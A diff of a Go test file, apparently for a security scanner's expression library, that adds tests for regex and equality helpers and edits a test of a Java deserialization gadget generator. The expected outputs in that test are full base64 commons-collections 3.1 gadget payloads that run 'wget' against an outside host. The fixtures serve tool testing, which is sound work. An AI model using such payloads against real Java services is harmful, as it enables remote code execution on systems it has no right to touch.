@@ -252,7 +252,7 @@ func TestGetPrintableDslFunctionSignatures(t *testing.T) {
 	dec_to_hex(arg1 interface{}) interface{}
 	deflate(arg1 interface{}) interface{}
 	ends_with(str string, suffix ...string) bool
-	equals_any(arg1, arg2 interface{}) interface{}
+	equals_any(s interface{}, subs ...interface{}) bool
 	generate_java_gadget(arg1, arg2, arg3 interface{}) interface{}
 	generate_jwt(jsonString, algorithm, optionalSignature string, optionalMaxAgeUnix interface{}) string
 	gzip(arg1 interface{}) interface{}
@@ -289,8 +289,8 @@ func TestGetPrintableDslFunctionSignatures(t *testing.T) {
 	rand_text_alphanumeric(length uint, optionalBadChars string) string
 	rand_text_numeric(length uint, optionalBadNumbers string) string
 	regex(arg1, arg2 interface{}) interface{}
-	regex_all(arg1, arg2 interface{}) interface{}
-	regex_any(arg1, arg2 interface{}) interface{}
+	regex_all(pattern string, inputs ...string) bool
+	regex_any(pattern string, inputs ...string) bool
 	remove_bad_chars(arg1, arg2 interface{}) interface{}
 	repeat(arg1, arg2 interface{}) interface{}
 	replace(arg1, arg2, arg3 interface{}) interface{}
@@ -381,9 +381,9 @@ func TestDslExpressions(t *testing.T) {
 		`deflate("Hello")`:                              "\xf2\x48\xcd\xc9\xc9\x07\x04\x00\x00\xff\xff",
 		`inflate(hex_decode("f348cdc9c90700"))`:         "Hello",
 		`inflate(hex_decode("f248cdc9c907040000ffff"))`: "Hello",
-		`gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))`:       "Hello",
-		`generate_java_gadget("commons-collections3.1", "wget https://{{interactsh-url}}", "base64")`: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAJmh0dHBzOi8vZ2l0aHViLmNvbS9qb2FvbWF0b3NmL2pleGJvc3Mgc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl%2BwoepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh%2Bj/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB%2BABtzcQB%2BABN1cQB%2BABgAAAACcHVxAH4AGAAAAAB0AAZpbnZva2V1cQB%2BABsAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAH3dnZXQgaHR0cHM6Ly97e2ludGVyYWN0c2gtdXJsfX10AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA==",
-		`generate_jwt("{\"name\":\"John Doe\",\"foo\":\"bar\"}", "HS256", "hello-world")`:             []byte("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb28iOiJiYXIiLCJuYW1lIjoiSm9obiBEb2UifQ.EsrL8lIcYJR_Ns-JuhF3VCllCP7xwbpMCCfHin_WT6U"),
+		`gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))`: "Hello",
+		`generate_java_gadget("commons-collections3.1", "wget http://scanme.sh", "base64")`:     "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAJmh0dHBzOi8vZ2l0aHViLmNvbS9qb2FvbWF0b3NmL2pleGJvc3Mgc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl%2BwoepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh%2Bj/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB%2BABtzcQB%2BABN1cQB%2BABgAAAACcHVxAH4AGAAAAAB0AAZpbnZva2V1cQB%2BABsAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAFXdnZXQgaHR0cDovL3NjYW5tZS5zaHQABGV4ZWN1cQB%2BABsAAAABcQB%2BACBzcQB%2BAA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4",
+		`generate_jwt("{\"name\":\"John Doe\",\"foo\":\"bar\"}", "HS256", "hello-world")`:       []byte("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb28iOiJiYXIiLCJuYW1lIjoiSm9obiBEb2UifQ.EsrL8lIcYJR_Ns-JuhF3VCllCP7xwbpMCCfHin_WT6U"),
 		`base64_decode("SGVsbG8=")`:                               "Hello",
 		`hex_decode("6161")`:                                      "aa",
 		`len("Hello")`:                                            float64(5),
@@ -702,4 +702,114 @@ func Test_Zlib_decompression_bomb(t *testing.T) {
 	require.NoError(t, err, "Error while evaluating the compiled %q expression", dslExpression)
 	// Cannot be greater than 10MB
 	require.LessOrEqual(t, int64(len(actualResult.(string))), DefaultMaxDecompressionSize, "The result is too large")
+}
+
+func TestRegexFunctions(t *testing.T) {
+	t.Run("regex", func(t *testing.T) {
+		tests := map[string]interface{}{
+			`regex("H([a-z]+)o", "Hello")`:                    true,
+			`regex("\\d+", "abc")`:                            false,
+			`regex("[a-z]+", "123")`:                          false,
+			`regex("^\\d+$", "123abc")`:                       false,
+			`regex("(?i)HELLO", "hello")`:                     true,
+			`regex("^$", "")`:                                 true,
+			`regex("\\s+", "nospaces")`:                       false,
+			`regex("\\s+", "has some spaces")`:                true,
+			`regex("^\\w+@\\w+\\.\\w+$", "test@example.com")`: true,
+		}
+		testDslExpressions(t, tests)
+	})
+
+	t.Run("regex_all", func(t *testing.T) {
+		tests := map[string]interface{}{
+			// Basic numeric tests
+			`regex_all("\\d+", "123", "456", "789")`: true,
+			`regex_all("\\d+", "123", "abc", "789")`: false,
+			`regex_all("\\d+", "abc", "def", "ghi")`: false,
+
+			// Pattern matching tests
+			`regex_all("[a-z]+", "abc", "def", "ghi")`:    true,
+			`regex_all("[A-Z]+", "ABC", "DEF", "GHI")`:    true,
+			`regex_all("^[a-z]$", "a", "b", "c")`:         true,
+			`regex_all("^\\w+$", "abc", "123", "abc123")`: true,
+
+			// Edge cases
+			`regex_all("^$", "", "", "")`:          true,
+			`regex_all(".*", "", "abc", "123")`:    true,
+			`regex_all("^\\s*$", " ", " ", " ")`:   true,
+			`regex_all("^\\s+$", "   ", " ", "	")`: true,
+
+			// Email pattern test
+			`regex_all("^\\w+@\\w+\\.\\w+$", "test@test.com", "admin@test.com")`: true,
+			`regex_all("^\\w+@\\w+\\.\\w+$", "test@test.com", "invalid")`:        false,
+
+			// Case sensitivity tests
+			`regex_all("(?i)test", "TEST", "Test", "test")`: true,
+			`regex_all("test", "TEST", "Test", "test")`:     false,
+		}
+		testDslExpressions(t, tests)
+	})
+
+	t.Run("regex_any", func(t *testing.T) {
+		tests := map[string]interface{}{
+			// Basic numeric tests
+			`regex_any("\\d+", "123", "abc", "789")`: true,
+			`regex_any("\\d+", "abc", "def", "ghi")`: false,
+			`regex_any("\\d+", "123", "456", "789")`: true,
+
+			// Pattern matching tests
+			`regex_any("[a-z]+", "ABC", "def", "GHI")`:    true,
+			`regex_any("[A-Z]+", "abc", "def", "GHI")`:    true,
+			`regex_any("^[a-z]$", "1", "b", "2")`:         true,
+			`regex_any("^\\w+$", "!!!", "@#$", "abc123")`: true,
+
+			// Edge cases
+			`regex_any("^$", "a", "b", "")`:          true,
+			`regex_any("^$", "a", "b", "c")`:         false,
+			`regex_any("^\\s+$", "abc", " ", "def")`: true,
+
+			// Email pattern test
+			`regex_any("^\\w+@\\w+\\.\\w+$", "invalid", "test@test.com")`: true,
+			`regex_any("^\\w+@\\w+\\.\\w+$", "invalid1", "invalid2")`:     false,
+
+			// Case sensitivity tests
+			`regex_any("(?i)test", "ABC", "Test", "xyz")`: true,
+			`regex_any("test", "TEST", "TEST", "TEST")`:   false,
+		}
+		testDslExpressions(t, tests)
+	})
+}
+
+func TestEqualAnyFunction(t *testing.T) {
+	t.Run("equals_any", func(t *testing.T) {
+		tests := map[string]interface{}{
+			// Basic string matching tests
+			`equals_any("test", "test", "foo", "bar")`: true,
+			`equals_any("foo", "test", "bar", "baz")`:  false,
+			`equals_any("hello", "hello", "world")`:    true,
+			`equals_any("world", "hello", "world")`:    true,
+			`equals_any("none", "hello", "world")`:     false,
+
+			// Empty string tests
+			`equals_any("", "", "test")`:     true,
+			`equals_any("test", "", "test")`: true,
+			`equals_any("", "test", "foo")`:  false,
+
+			// Case sensitivity tests
+			`equals_any("TEST", "test", "Test", "TEST")`: true,
+			`equals_any("test", "TEST", "Test")`:         false,
+
+			// Special characters tests
+			`equals_any("test.com", "test.com", "test-com")`: true,
+			`equals_any("test-com", "test.com", "test_com")`: false,
+			`equals_any("test@123", "test@123", "test123")`:  true,
+
+			// Numeric value tests (converted to string)
+			`equals_any("123", "123", "456", "789")`: true,
+			`equals_any("123", 123, "456", "789")`:   true,
+			`equals_any(123, "123", "456", "789")`:   true,
+			`equals_any("123", "456", "789")`:        false,
+		}
+		testDslExpressions(t, tests)
+	})
 }
